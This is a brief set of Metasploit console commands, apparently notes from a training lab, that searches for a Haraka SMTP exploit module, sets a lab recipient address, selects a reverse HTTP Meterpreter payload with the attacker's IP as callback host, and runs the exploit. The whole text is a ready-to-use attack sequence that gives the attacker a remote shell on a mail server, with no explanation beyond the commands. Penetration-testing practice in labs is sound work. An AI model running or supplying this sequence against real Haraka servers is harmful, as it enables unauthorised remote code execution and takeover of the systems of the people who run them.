- __`search type:exploit name:haraka`__
```
use exploit/Linux/smtp/haraka
set SRVPORT 9898
set email_to root@attackdefense.test
set payload Linux/x64/meterpreter_reverse_http
set LHOST <yourip>
exploit
```
